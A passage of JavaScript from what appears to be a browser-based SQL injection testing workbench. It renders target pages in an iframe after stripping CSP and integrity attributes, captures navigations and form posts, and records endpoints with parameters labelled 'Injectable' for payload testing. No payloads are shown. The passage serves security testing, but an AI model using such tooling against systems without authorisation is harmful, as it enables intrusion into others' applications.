    var r = el.getBoundingClientRect();
    if (r.width < CFG.minW || r.height < CFG.minH) return true;
    if (areaOf(el) < CFG.minArea) return true;
    return false;
  }

  function process(el) {
    if (shouldSkip(el)) return;
    var cs = getComputedStyle(el);
    var bg = parseColor(cs.backgroundColor);
    if (!shouldDim(bg)) return;

    var strength = isNearWhite(bg) ? CFG.dimWhite : CFG.dimColor;
    var nb = dimInFamily(bg, strength);
    el.style.setProperty('background-color', cssRgb(nb), 'important');

    if (!CFG.fixText) return;

    var color = parseColor(cs.color);
    if (color && luminance(nb) < 0.4 && luminance(color) < 0.4) {
      el.style.setProperty('color', cssRgb(lightenText(color)), 'important');
    } else if (color && luminance(color) > 0.7 && luminance(nb) > 0.55) {
      // still too bright text on bright-ish panel
      var hsl = rgbToHsl(color);
      var darker = hslToRgb(hsl.h, hsl.s, Math.min(hsl.l, 0.25));
      el.style.setProperty('color', cssRgb(darker), 'important');
    }

    var kids = el.children;
    for (var i = 0; i < kids.length; i++) {
      var kid = kids[i];
      if (areaOf(kid) >= CFG.minArea) continue;
      try {
        var kcs = getComputedStyle(kid);
        var kc = parseColor(kcs.color);
        if (kc && luminance(kc) < 0.4 && luminance(nb) < 0.4) {
          kid.style.setProperty('color', cssRgb(lightenText(kc)), 'important');
        }
      } catch (e) {}
    }
  }

  function scan() {
    if (!document.body) return;
    var all = document.body.querySelectorAll('*');
    for (var i = 0; i < all.length; i++) {
      try { process(all[i]); } catch (e) {}
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function(){ setTimeout(scan, 30); });
  } else {
    setTimeout(scan, 30);
  }
  setTimeout(scan, 400);
})();
<\/script>` : '';

      const inject = softCss + strictScript;
      if (/<\/head>/i.test(html)) {
        return html.replace(/<\/head>/i, inject + '</head>');
      }
      if (/<body[^>]*>/i.test(html)) {
        return html.replace(/<body[^>]*>/i, (m) => m + inject);
      }
      return inject + html;
    }

    /**
     * Light prep so site UI JS has a better chance inside srcdoc iframe:
     * - Strip CSP meta (often blocks inline/external scripts in preview)
     * - Drop SRI integrity on script/link (mismatches if anything was rewritten)
     * Does NOT strip or rewrite script bodies — we want menus/tabs/dropdowns to work.
     */
    function prepareHtmlForRender(html) {
      if (!html) return html;
      let out = String(html);
      // <meta http-equiv="Content-Security-Policy" ...>
      out = out.replace(
        /<meta[^>]+http-equiv\s*=\s*["']?Content-Security-Policy["'][^>]*>/gi,
        ''
      );
      // <meta name="Content-Security-Policy" ...> (rare)
      out = out.replace(
        /<meta[^>]+name\s*=\s*["']?Content-Security-Policy["'][^>]*>/gi,
        ''
      );
      // Remove integrity= from script/link so browser won't block after base/proxy tweaks
      out = out.replace(
        /(<script\b[^>]*?)\s+integrity\s*=\s*(["'][^"']*["']|[^\s>]+)/gi,
        '$1'
      );
      out = out.replace(
        /(<link\b[^>]*?)\s+integrity\s*=\s*(["'][^"']*["']|[^\s>]+)/gi,
        '$1'
      );
      return out;
    }

    /**
     * Inject a small script into the rendered HTML that:
     *  - Intercepts <a> clicks → posts URL to parent
     *  - Intercepts form submits → posts correct action/method/body to parent
     * Fixes empty action (about:srcdoc) by resolving against real page URL.
     */
    function injectInteractionBridge(html, pageUrl) {
      const safePage = (pageUrl || '').replace(/\\/g, '\\\\').replace(/"/g, '\\"');
      const bridge = `
<script>
(function(){
  if (window.__sqliBridge) return;
  window.__sqliBridge = true;
  var PAGE_URL = "${safePage}";

  function pageBase() {
    try {
      var b = document.querySelector('base');
      if (b && b.href) return b.href;
    } catch(e) {}
    return PAGE_URL || document.baseURI || '';
  }

  function absUrl(href) {
    var base = pageBase();
    if (!href || href === '') return base;
    try { return new URL(href, base).href; }
    catch(e) { return href; }
  }

  // Track which submit button was clicked (for name=value)
  var lastSubmitter = null;
  document.addEventListener('click', function(e) {
    var t = e.target;
    if (!t) return;
    var btn = t.closest('button, input');
    if (btn && (btn.type === 'submit' || btn.type === 'image' || (btn.tagName === 'BUTTON' && !btn.type))) {
      lastSubmitter = btn;
    }
    // Link clicks
    var a = t.closest('a');
    if (!a || !a.href) return;
    if (e.defaultPrevented || e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
    var href = a.getAttribute('href');
    if (!href || href.charAt(0) === '#' || href.indexOf('javascript:') === 0) return;
    e.preventDefault();
    e.stopPropagation();
    parent.postMessage({
      type: 'sqli-navigate',
      url: absUrl(href),
      method: 'GET',
      post_data: ''
    }, '*');
  }, true);

  function serializeForm(form, submitter) {
    var pairs = [];
    var elements = form.elements;
    for (var i = 0; i < elements.length; i++) {
      var el = elements[i];
      if (!el.name || el.disabled) continue;
      var type = (el.type || '').toLowerCase();
      var tag = el.tagName.toUpperCase();
      if (type === 'file' || type === 'reset' || type === 'button') continue;
      if (type === 'submit' || type === 'image') continue; // handled via submitter
      if ((type === 'checkbox' || type === 'radio') && !el.checked) continue;
      if (tag === 'SELECT' && el.multiple) {
        for (var j = 0; j < el.options.length; j++) {
          if (el.options[j].selected) {
            pairs.push(encodeURIComponent(el.name) + '=' + encodeURIComponent(el.options[j].value));
          }
        }
        continue;
      }
      pairs.push(encodeURIComponent(el.name) + '=' + encodeURIComponent(el.value == null ? '' : el.value));
    }
    if (submitter && submitter.name) {
      pairs.push(encodeURIComponent(submitter.name) + '=' + encodeURIComponent(submitter.value || ''));
    }
    return pairs.join('&');
  }

  document.addEventListener('submit', function(e) {
    var form = e.target;
    if (!form || form.tagName !== 'FORM') return;
    e.preventDefault();
    e.stopPropagation();

    var submitter = e.submitter || lastSubmitter || null;
    lastSubmitter = null;

    // Resolve action: empty / missing → current page URL (NOT about:srcdoc)
    var actionAttr = form.getAttribute('action');
    var formaction = submitter && submitter.getAttribute && submitter.getAttribute('formaction');
    var action = (formaction != null && formaction !== '') ? formaction
               : (actionAttr != null && actionAttr !== '') ? actionAttr
               : PAGE_URL;
    var methodAttr = (submitter && submitter.getAttribute && submitter.getAttribute('formmethod'))
                   || form.getAttribute('method')
                   || 'GET';
    var method = String(methodAttr).toUpperCase();
    if (method !== 'POST' && method !== 'PUT' && method !== 'PATCH') method = 'GET';

    var data = serializeForm(form, submitter);
    var target = absUrl(action);

    if (method === 'GET') {
      if (data) {
        target += (target.indexOf('?') >= 0 ? '&' : '?') + data;
      }
      data = '';
    }

    parent.postMessage({
      type: 'sqli-navigate',
      url: target,
      method: method,
      post_data: data
    }, '*');
  }, true);
})();
<\/script>`;

      if (/<\/body>/i.test(html)) {
        return html.replace(/<\/body>/i, bridge + '</body>');
      }
      return html + bridge;
    }

    // Listen for navigation requests from the rendered iframe
    window.addEventListener('message', (event) => {
      if (!event.data || event.data.type !== 'sqli-navigate') return;
      const { url, method, post_data } = event.data;
      if (!url) return;

      // Record endpoint if recording is ON
      if (state.recording) {
        recordEndpoint(url, method || 'GET', post_data);
      }

      // Update UI fields
      const m = (method || 'GET').toUpperCase();
      urlInput.value = url;
      methodSelect.value = (m === 'POST' || m === 'PUT' || m === 'PATCH') ? 'POST' : 'GET';
      if (typeof updateBodyVisibility === 'function') updateBodyVisibility();

      // POST body goes into Request Body field — NOT payload workbench
      if (m === 'POST' || m === 'PUT' || m === 'PATCH') {
        if (postBodyInput) postBodyInput.value = post_data || '';
      }

      showToast(`Navigating: ${m} ${url.slice(0, 60)}…`);
      sendRequest();
    });

    // ===== Endpoint Recorder =====
    function endpointKey(path, paramNames, method) {
      return `${method || 'GET'}|${path}|${[...paramNames].sort().join('&')}`;
    }

    function parseEndpoint(url, method, postData) {
      try {
        const u = new URL(url, 'http://dummy.local');
        const path = u.pathname || '/';
        const paramNames = [];
        u.searchParams.forEach((_, k) => {
          if (!paramNames.includes(k)) paramNames.push(k);
        });
        // Also parse POST body keys if form-urlencoded
        if (postData && typeof postData === 'string' && postData.includes('=')) {
          try {
            const ps = new URLSearchParams(postData);
            ps.forEach((_, k) => {
              if (!paramNames.includes(k)) paramNames.push(k);
            });
          } catch (_) {}
        }
        return {
          origin: u.origin === 'http://dummy.local' ? '' : u.origin,
          path,
          paramNames,
          sampleUrl: url,
          method: (method || 'GET').toUpperCase(),
        };
      } catch {
        return null;
      }
    }

    function recordEndpoint(url, method, postData) {
      const parsed = parseEndpoint(url, method, postData);
      if (!parsed) return;
      // Only interesting if has query/body params or path looks dynamic
      const key = endpointKey(parsed.path, parsed.paramNames, parsed.method);
      const existing = state.endpoints.find(e => e.key === key);
      if (existing) {
        existing.count += 1;
        existing.sampleUrl = url; // keep latest sample
        renderEndpoints();
        return;
      }
      state.endpoints.push({
        key,
        origin: parsed.origin,
        path: parsed.path,
        paramNames: parsed.paramNames,
        sampleUrl: url,
        method: parsed.method,
        count: 1,
        seenAt: Date.now(),
      });
      renderEndpoints();
      if (parsed.paramNames.length) {
        showToast(`Discovered: ${parsed.path} [${parsed.paramNames.join(', ')}]`, 'success');
      }
    }

    function renderEndpoints() {
      const panel = $('#endpointPanel');
      const list = $('#endpointList');
      const empty = $('#endpointEmpty');
      const countEl = $('#endpointCount');
      if (!panel || !list) return;

      if (state.recording || state.endpoints.length > 0) {
        panel.classList.remove('hidden');
      }
      if (countEl) countEl.textContent = String(state.endpoints.length);

      if (state.endpoints.length === 0) {
        if (empty) {
          empty.style.display = '';
          empty.textContent = state.recording
            ? 'Recording… interact with the rendered page.'
            : 'No endpoints discovered yet.';
        }
        list.innerHTML = '';
        return;
      }
      if (empty) empty.style.display = 'none';

      list.innerHTML = state.endpoints.map((ep, idx) => {
        const params = ep.paramNames.length
          ? ep.paramNames.map(p => `<span class="endpoint-param injectable" title="Injectable param">${escapeHtml(p)}</span>`).join('')
          : `<span class="endpoint-param" title="No query params">no params</span>`;
        return `
          <div class="endpoint-item" data-idx="${idx}" title="Click to load into URL bar">
            <div class="endpoint-path"><span style="color:var(--accent-cyan)">${escapeHtml(ep.method)}</span> ${escapeHtml(ep.path)}</div>
            <div class="endpoint-params">${params}</div>
            <div class="endpoint-meta">seen ×${ep.count} · sample: ${escapeHtml((ep.sampleUrl || '').slice(0, 80))}</div>
          </div>`;
      }).join('');

      list.querySelectorAll('.endpoint-item').forEach(el => {
        el.addEventListener('click', () => {
          const ep = state.endpoints[+el.dataset.idx];
          if (!ep) return;
          // Build URL with $1, $2 placeholders for each param
          let url = (ep.origin || '') + ep.path;
          if (ep.paramNames.length) {
            url += '?' + ep.paramNames.map((p, i) => `${p}=$${i + 1}`).join('&');
          }
          urlInput.value = url;
          methodSelect.value = ep.method === 'POST' ? 'POST' : 'GET';
          // Prefill workbench with sample values as separate lines
          try {
            const u = new URL(ep.sampleUrl);
            const lines = ep.paramNames.map(p => u.searchParams.get(p) || '');
            payloadInput.value = lines.join('\n');
          } catch (_) {}
          if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
          if (typeof updateBodyVisibility === 'function') updateBodyVisibility();
          showToast('Loaded endpoint → URL + $ placeholders', 'success');
        });
      });
    }

    // ===== Tabs =====
    let activeTab = 'rendered';
    $$('.tab-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        $$('.tab-btn').forEach(b => b.classList.remove('active'));
        $$('.tab-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        $(`#tab-${btn.dataset.tab}`).classList.add('active');
        activeTab = btn.dataset.tab;
      });
    });

    // ===== Fullscreen Modal (Expand) =====
    const modalOverlay = $('#modalOverlay');
    const modalBody = $('#modalBody');
    const modalTitle = $('#modalTitle');
    const modalCloseBtn = $('#modalCloseBtn');
    const expandBtn = $('#expandBtn');

    const TAB_TITLES = {
      rendered: 'Rendered View',
      raw: 'Raw Response',
      headers: 'Headers & Metadata',
    };

    function openModal() {
      const title = TAB_TITLES[activeTab] || activeTab;
      modalTitle.innerHTML = `${title} <span>Fullscreen</span>`;
      modalBody.innerHTML = '';

      if (activeTab === 'rendered') {
        const srcdoc = state.lastRenderedHtml || renderedFrame.srcdoc || '';
        if (!srcdoc) {
          modalBody.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--text-muted);font-size:14px;">No rendered content available. Send a request first.</div>';
        } else {
          const iframe = document.createElement('iframe');
          iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-pointer-lock allow-downloads';
          iframe.srcdoc = srcdoc;
          modalBody.appendChild(iframe);
        }
      } else if (activeTab === 'raw') {
        const pre = document.createElement('pre');
        pre.className = 'raw-response';
        pre.style.cssText = 'flex:1;overflow:auto;padding:20px;margin:0;';
        pre.innerHTML = rawResponse.innerHTML || 'No response data.';
        modalBody.appendChild(pre);
      } else if (activeTab === 'headers') {
        const wrap = document.createElement('div');
        wrap.className = 'meta-table-wrap';
        // Clone the current metadata table content
        wrap.innerHTML = metaTableWrap.innerHTML;
        modalBody.appendChild(wrap);
      }

      modalOverlay.classList.add('open');
      document.body.style.overflow = 'hidden';
    }

    function closeModal() {
      modalOverlay.classList.remove('open');
      modalBody.innerHTML = '';
      document.body.style.overflow = '';
    }

    expandBtn.addEventListener('click', openModal);
    modalCloseBtn.addEventListener('click', closeModal);

    // Night Protect — 3 modes: 0 off, 1 soft, 2 strict
    const nightProtectBtns = () => [$('#nightProtectBtn'), $('#nightProtectBtnSettings')].filter(Boolean);

    function syncNightProtectBtn() {
      const mode = state.nightProtectMode | 0;
      state.nightProtect = mode > 0;
      const labels = ['🌙 Off', '🌙 Soft', '🌙 Strict'];
      const classes = ['np-off', 'np-soft', 'np-strict'];
      const titles = [
        'Night Protect OFF — click for Soft',
        'Night Protect Soft — click for Strict',
        'Night Protect Strict — click → Soft · double-click or Ctrl+click → Off',
      ];
      nightProtectBtns().forEach((btn) => {
        btn.classList.remove('np-off', 'np-soft', 'np-strict', 'active');
        btn.classList.add(classes[mode] || 'np-off');
        if (mode > 0) btn.classList.add('active');
        btn.textContent = labels[mode] || labels[0];
        btn.title = titles[mode] || titles[0];
      });
    }

    function setNightProtectMode(mode) {
      state.nightProtectMode = Math.max(0, Math.min(2, mode));
      state.nightProtect = state.nightProtectMode > 0;
      syncNightProtectBtn();
      if (state.activeHistoryId != null) {
        const item = state.history.find(h => h.id === state.activeHistoryId);
        if (item) displayResponse(item.response, item.url);
      } else if (state.lastRenderedHtml && state.nightProtectMode > 0) {
        // re-apply on current frame if possible via last response
      }
      const names = ['OFF', 'Soft', 'Strict'];
      showToast('Night Protect: ' + names[state.nightProtectMode], 'success');
    }

    function onNightProtectClick(e) {
      const mode = state.nightProtectMode | 0;
      const now = Date.now();
      // From Strict: safety — single click goes Soft; Ctrl+click or double-click turns Off
      if (mode === 2) {
        if (e.ctrlKey || e.metaKey) {
          setNightProtectMode(0);
          state._npLastClick = 0;
          return;
        }
        if (now - (state._npLastClick || 0) < 450) {
          setNightProtectMode(0);
          state._npLastClick = 0;
          return;
        }
        state._npLastClick = now;
        setNightProtectMode(1);
        return;
      }
      state._npLastClick = now;
      if (mode === 0) setNightProtectMode(1);
      else if (mode === 1) setNightProtectMode(2);
    }

    syncNightProtectBtn();
    nightProtectBtns().forEach((btn) => {
      btn.addEventListener('click', onNightProtectClick);
    });

    // Record navigations toggle
    const recordNavBtn = $('#recordNavBtn');
    function syncRecordBtn() {
      if (!recordNavBtn) return;
      recordNavBtn.classList.toggle('recording', state.recording);
      recordNavBtn.textContent = state.recording ? '■ Recording' : '● Record';
      const panel = $('#endpointPanel');
      if (panel && state.recording) panel.classList.remove('hidden');
    }
    if (recordNavBtn) {
      recordNavBtn.addEventListener('click', () => {
        state.recording = !state.recording;
        syncRecordBtn();
        renderEndpoints();
        showToast(state.recording ? 'Recording ON — browse the rendered page' : 'Recording OFF', 'success');
      });
    }
    const endpointPanelHeader = $('#endpointPanelHeader');
    const endpointMinBtn = $('#endpointMinBtn');
    if (endpointPanelHeader) {
      endpointPanelHeader.addEventListener('click', (e) => {
        if (e.target.closest('#clearEndpointsBtn')) return;
        const panel = $('#endpointPanel');
        if (!panel) return;
        panel.classList.toggle('minimized');
        if (endpointMinBtn) endpointMinBtn.textContent = panel.classList.contains('minimized') ? '▸' : '▾';
      });
    }
    const clearEndpointsBtn = $('#clearEndpointsBtn');
    if (clearEndpointsBtn) {
      clearEndpointsBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        state.endpoints = [];
        renderEndpoints();
        if (!state.recording) {
          const panel = $('#endpointPanel');
          if (panel) panel.classList.add('hidden');
        }
        showToast('Endpoints cleared');
      });
    }

    // Close on overlay click (outside the box)
    modalOverlay.addEventListener('click', (e) => {
      if (e.target === modalOverlay) closeModal();
    });

    // Close on Escape
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modalOverlay.classList.contains('open')) {
        closeModal();
      }
    });

    // ===== Virtual Panel Manager (drawers / floating) =====
    const VPANEL_MAP = {
      payload: '#payloadWorkbench',
      history: '#historyPanel',
      tools: '#toolsPanel',
      cheatsheet: '#cheatSheetPanel',
      proxy: '#proxyPanel',
      settings: '#settingsPanel',
      'adv-filter': '#advFilterPanel',
      'attack-dialog': '#attackNameDialog',
      'payload-lib': '#payloadLibPanel',
      converter: '#converterPanel',
      'session-mgr': '#sessionMgrPanel',
      'attack-config': '#attackConfigPanel',
      'hist-response': '#histResponsePanel',
      'cookie-bulk-import': '#cookieBulkImportPanel',
      'cookie-bulk-export': '#cookieBulkExportPanel',
      'attack-scope': '#attackScopePanel',
      'attack-slot-stop': '#attackSlotStopPanel',
      'attack-combos': '#attackCombosPanel',
    };
    const PINNABLE = new Set(['payload', 'history', 'cheatsheet', 'proxy', 'settings', 'tools', 'payload-lib', 'converter']);
    const PIN_BTN_SEL = {
      payload: '#payloadPinBtn',
      history: '#historyPinBtn',
      cheatsheet: '#cheatPinBtn',
      proxy: '#proxyPinBtn',
      settings: '#settingsPinBtn',
      tools: '#toolsPinBtn',
      'payload-lib': '#payloadLibPinBtn',
      converter: '#converterPinBtn',
    };
    // Per-panel minimize (shelf) — inverse of ↗; only while pinned
    const SHELF_BTN_SEL = {
      payload: '#payloadShelfBtn',
      history: '#historyShelfBtn',
      cheatsheet: '#cheatShelfBtn',
      proxy: '#proxyShelfBtn',
      settings: '#settingsShelfBtn',
      tools: '#toolsShelfBtn',
      'payload-lib': '#payloadLibShelfBtn',
      converter: '#converterShelfBtn',
    };

    function updateShelfBtn(name) {
      const sel = SHELF_BTN_SEL[name];
      const btn = sel ? $(sel) : null;
      const el = $(VPANEL_MAP[name]);
      if (!btn || !el) return;
      // Show whenever the panel is pinned (pin implies floating window)
      const show = el.classList.contains('pinned');
      if (show) {
        btn.removeAttribute('hidden');
        btn.hidden = false;
        btn.style.display = 'inline-flex';
        btn.style.visibility = 'visible';
        btn.style.opacity = '1';
      } else {
        btn.setAttribute('hidden', '');
        btn.hidden = true;
        btn.style.display = 'none';
      }
      const shelved = el.classList.contains('shelved');
      btn.classList.toggle('is-shelved', shelved);
      btn.textContent = shelved ? '↗' : '↙';
      btn.title = shelved
        ? 'Restore this panel from tray'
        : 'Minimize this panel to tray (per-panel shelf)';
    }
    const PIN_DEFAULTS = {
      payload: { top: '80px', right: '24px', width: '420px', height: '420px' },
      history: { top: '72px', left: '16px', width: '360px', height: Math.min(window.innerHeight * 0.7, 620) + 'px' },
      cheatsheet: { top: '72px', left: '10%', width: '480px', height: Math.min(window.innerHeight * 0.75, 640) + 'px' },
      proxy: { top: '72px', left: '12%', width: '520px', height: Math.min(window.innerHeight * 0.75, 620) + 'px' },
      settings: { top: '64px', left: Math.max(24, (window.innerWidth - 640) / 2) + 'px', width: Math.min(640, window.innerWidth * 0.92) + 'px', height: Math.min(window.innerHeight * 0.8, 700) + 'px' },
      tools: { top: '64px', right: '16px', width: '360px', height: Math.min(window.innerHeight * 0.7, 560) + 'px' },
      'payload-lib': { top: '96px', left: Math.max(24, (window.innerWidth - 400) / 2) + 'px', width: '400px', height: Math.min(window.innerHeight * 0.55, 480) + 'px' },
      converter: { top: '72px', left: Math.max(24, (window.innerWidth - 640) / 2) + 'px', width: Math.min(640, window.innerWidth * 0.92) + 'px', height: Math.min(window.innerHeight * 0.65, 560) + 'px' },
    };
    const vpanelBackdrop = $('#vpanelBackdrop');
    let activeVPanel = null;
    let panelZCounter = 460;

    function isPanelPinnedOpen(name) {
      const el = $(VPANEL_MAP[name]);
      return !!(el && el.classList.contains('pinned') && el.classList.contains('open'));
    }
    function isPayloadPinnedOpen() { return isPanelPinnedOpen('payload'); }
    function isHistoryPinnedOpen() { return isPanelPinnedOpen('history'); }

    /** Raise any open panel above others (Windows-style window focus) */
    function focusPanel(name) {
      const panel = $(VPANEL_MAP[name]);
      if (!panel || !panel.classList.contains('open')) return;
      panelZCounter += 1;
      panel.style.zIndex = String(panelZCounter);
      $$('.vpanel').forEach((el) => el.classList.remove('panel-front'));
      panel.classList.add('panel-front');
      activeVPanel = name;
      $$('.nav-tool').forEach((b) => b.classList.remove('active'));
      const navBtn = document.querySelector(`.nav-tool[data-panel="${name}"]`);
      if (navBtn) navBtn.classList.add('active');
    }
    function focusPinnedPanel(name) { focusPanel(name); }

    function unpinPanel(name) {
      const el = $(VPANEL_MAP[name]);
      if (!el) return;
      el.classList.remove('pinned', 'panel-front', 'shelved');
      el.style.top = '';
      el.style.left = '';
      el.style.right = '';
      el.style.bottom = '';
      el.style.width = '';
      el.style.height = '';
      el.style.maxHeight = '';
      el.style.transform = '';
      el.style.zIndex = '';
      const pinBtn = PIN_BTN_SEL[name] ? $(PIN_BTN_SEL[name]) : null;
      if (pinBtn) {
        pinBtn.classList.remove('active');
        pinBtn.textContent = pinBtn.classList.contains('vpanel-action-btn') ? '⊙' : 'Pin';
      }
      if (typeof updateShelfBtn === 'function') updateShelfBtn(name);
      if (typeof updatePinTray === 'function') updatePinTray();
    }

    function openVPanel(name) {
      const sel = VPANEL_MAP[name];
      if (!sel) return;
      const panel = $(sel);
      if (!panel) return;

      // Pin = never auto-close. Work panels stack (don't kill each other).
      const MODALS = new Set(['settings', 'adv-filter', 'attack-dialog', 'attack-config', 'hist-response', 'cookie-bulk-import', 'cookie-bulk-export', 'attack-scope', 'attack-slot-stop', 'attack-combos', 'session-mgr']);
      const WORK = new Set(['payload', 'history', 'cheatsheet', 'proxy', 'tools', 'payload-lib', 'converter']);

      Object.keys(VPANEL_MAP).forEach((k) => {
        if (k === name) return;
        const el = $(VPANEL_MAP[k]);
        if (!el || !el.classList.contains('open')) return;
        // Pinned panels never auto-close
        if (el.classList.contains('pinned')) return;
        // Work tools stack on top of each other (Payload stays when Saved/Converter opens)
        if (WORK.has(name) && WORK.has(k)) return;
        // Opening a modal: keep work panels underneath
        if (MODALS.has(name) && WORK.has(k)) return;
        el.classList.remove('open');
      });
      // Bring panel out of shelf when opened
      panel.classList.remove('shelved');
      $$('.nav-tool').forEach((b) => b.classList.remove('active'));

      panel.classList.add('open');
      activeVPanel = name;

      // Drawers: clear leftover pinned geometry so slide-in works (tools was stuck off-screen)
      if ((name === 'history' || name === 'tools') && !panel.classList.contains('pinned')) {
        panel.style.top = '';
        panel.style.left = '';
        panel.style.right = '';
        panel.style.bottom = '';
        panel.style.width = '';
        panel.style.height = '';
        panel.style.maxHeight = '';
        panel.style.transform = '';
        panel.style.margin = '';
        panel.style.position = '';
      }

      // Raise z-index so the opened panel is on top of any stack underneath
      panelZCounter += 1;
      let z = panelZCounter;
      // Solo/pop-out tab: main panel is ~400; companions must stack above it
      if (document.body.classList.contains('solo-panel')) {
        const primary =
          (document.body.classList.contains('solo-payload') && name === 'payload') ||
          (document.body.classList.contains('solo-settings') && name === 'settings') ||
          (document.body.classList.contains('solo-history') && name === 'history');
        if (!primary) z = Math.max(z, 600 + (panelZCounter % 50));
      }
      panel.style.zIndex = String(z);

      const navBtn = document.querySelector(`.nav-tool[data-panel="${name}"]`);
      if (navBtn) navBtn.classList.add('active');

      // Always raise opened panel to front
      focusPanel(name);

      if (vpanelBackdrop) {
        if (PINNABLE.has(name) && panel.classList.contains('pinned')) {
          // only pinned work panel: no backdrop if nothing else needs it
          const needBd = Object.keys(VPANEL_MAP).some((k) => {
            const el = $(VPANEL_MAP[k]);
            return el && el.classList.contains('open') && !el.classList.contains('pinned');
          });
          vpanelBackdrop.classList.toggle('open', needBd);
        } else {
          vpanelBackdrop.classList.add('open');
        }
      }

      if (name === 'payload' && payloadInput) {
        setTimeout(() => payloadInput.focus(), 200);
      }
      if (typeof updatePinTray === 'function') updatePinTray();
    }

    function closeVPanel(name) {
      if (!name || name === 'adv-filter') {
        if (typeof closeAdvMatchesOverlay === 'function') closeAdvMatchesOverlay();
      }
      if (!name || name === 'settings') {
        if (typeof closeCookieManager === 'function') closeCookieManager();
      }
      const targets = name ? [name] : Object.keys(VPANEL_MAP);
      targets.forEach((k) => {
        const el = $(VPANEL_MAP[k]);
        if (!el) return;
        el.classList.remove('open');
        // Only unpin when that panel itself is being closed — pin means "don't auto-close"
        if (PINNABLE.has(k) && (!name || name === k)) unpinPanel(k);
        if (el) el.classList.remove('shelved');
      });
      if (typeof updatePinTray === 'function') updatePinTray();

      if (vpanelBackdrop) {
        const otherOpen = Object.keys(VPANEL_MAP).some((k) => {
          const el = $(VPANEL_MAP[k]);
          return el && el.classList.contains('open') && !(PINNABLE.has(k) && el.classList.contains('pinned'));
        });
        // non-pinned open panels need backdrop
        const needBd = Object.keys(VPANEL_MAP).some((k) => {
          const el = $(VPANEL_MAP[k]);
          return el && el.classList.contains('open') && !el.classList.contains('pinned');
        });
        vpanelBackdrop.classList.toggle('open', needBd);
      }
      $$('.nav-tool').forEach((b) => b.classList.remove('active'));
      // Prefer last focused among pinned
      if (isPanelPinnedOpen(activeVPanel)) {
        const navBtn = document.querySelector(`.nav-tool[data-panel="${activeVPanel}"]`);
        if (navBtn) navBtn.classList.add('active');
      } else if (isPayloadPinnedOpen()) {
        activeVPanel = 'payload';
        const navBtn = document.querySelector('.nav-tool[data-panel="payload"]');
        if (navBtn) navBtn.classList.add('active');
      } else if (isHistoryPinnedOpen()) {
        activeVPanel = 'history';
        const navBtn = document.querySelector('.nav-tool[data-panel="history"]');
        if (navBtn) navBtn.classList.add('active');
      } else {
        activeVPanel = null;
      }
    }

    function toggleVPanel(name) {
      const el = $(VPANEL_MAP[name]);
      if (el && el.classList.contains('open') && activeVPanel === name) closeVPanel(name);
      else openVPanel(name);
    }

    $$('.nav-tool[data-panel]').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        const name = btn.dataset.panel;
        // Ctrl/Cmd+click on History or Payload → open pinned
        if ((e.ctrlKey || e.metaKey) && PINNABLE.has(name)) {
          openVPanel(name);
          const panel = $(VPANEL_MAP[name]);
          if (panel && !panel.classList.contains('pinned')) {
            setPanelPinned(name, true, PIN_DEFAULTS[name] || {});
          }
          focusPinnedPanel(name);
          return;
        }
        // Already pinned & open → just bring to front / activate
        if (PINNABLE.has(name) && isPanelPinnedOpen(name)) {
          focusPinnedPanel(name);
          return;
        }
        toggleVPanel(name);
      });
    });

    // Clicking a pinned panel body also brings it to front
    PINNABLE.forEach((name) => {
      const el = $(VPANEL_MAP[name]);
      if (!el) return;
      el.addEventListener('mousedown', () => {
        if (el.classList.contains('pinned') && el.classList.contains('open')) {
          focusPinnedPanel(name);
        }
      }, true);
    });
    $$('[data-close-panel]').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        const panel = e.target.closest('.vpanel');
        const name = panel && panel.dataset.panel;
        closeVPanel(name || undefined);
      });
    });
    if (vpanelBackdrop) {
      vpanelBackdrop.addEventListener('click', () => {
        Object.keys(VPANEL_MAP).forEach((k) => {
          const el = $(VPANEL_MAP[k]);
          if (!el || !el.classList.contains('open')) return;
          if (el.classList.contains('pinned')) return;
          closeVPanel(k);
        });
      });
    }

    // ===== Shared Pin + Drag + Resize for Payload & History =====
    function setPanelPinned(name, on, defaults) {
      const panel = $(VPANEL_MAP[name]);
      if (!panel) return;
      defaults = defaults || PIN_DEFAULTS[name] || {};
      panel.classList.toggle('pinned', !!on);
      const pinBtn = PIN_BTN_SEL[name] ? $(PIN_BTN_SEL[name]) : null;
      if (pinBtn) {
        pinBtn.classList.toggle('active', !!on);
        if (pinBtn.classList.contains('vpanel-action-btn')) {
          pinBtn.textContent = '⊙';
        } else {
          pinBtn.textContent = on ? 'Pinned' : 'Pin';
        }
      }
      if (on) {
        // Pinned windows stay open (otherwise ↓ never appears)
        panel.classList.add('open');
        // Always ensure pinned geometry (drawers otherwise stay full-height)
        panel.style.position = 'fixed';
        panel.style.transform = 'none';
        panel.style.bottom = 'auto';
        if (!panel.style.top) panel.style.top = defaults.top || '80px';
        if (!panel.style.left && !panel.style.right) {
          if (defaults.right) {
            panel.style.right = defaults.right;
            panel.style.left = 'auto';
          } else {
            panel.style.left = defaults.left || '16px';
            panel.style.right = 'auto';
          }
        }
        if (!panel.style.width) panel.style.width = defaults.width || '360px';
        if (!panel.style.height) panel.style.height = defaults.height || Math.min(window.innerHeight * 0.7, 620) + 'px';
        // Drawers: force float metrics when pinned
        if (name === 'history' || name === 'tools') {
          panel.style.bottom = 'auto';
          if (!panel.style.height) panel.style.height = Math.min(window.innerHeight * 0.7, 620) + 'px';
        }
        panel.classList.remove('shelved');
        if (vpanelBackdrop) vpanelBackdrop.classList.remove('open');
        const label = name === 'payload' ? 'Payload'
          : name === 'history' ? 'History'
          : name === 'cheatsheet' ? 'Cheat Sheet'
          : name === 'proxy' ? 'Proxy' : name;
        showToast(`${label} pinned — drag & resize`, 'success');
      } else {
        // Full reset so drawers (tools/history) slide from the edge again
        panel.style.top = '';
        panel.style.left = '';
        panel.style.right = '';
        panel.style.bottom = '';
        panel.style.width = '';
        panel.style.height = '';
        panel.style.maxHeight = '';
        panel.style.transform = '';
        panel.style.margin = '';
        panel.style.position = '';
        panel.classList.remove('is-dragging', 'no-transition');
        if (panel.classList.contains('open') && vpanelBackdrop) {
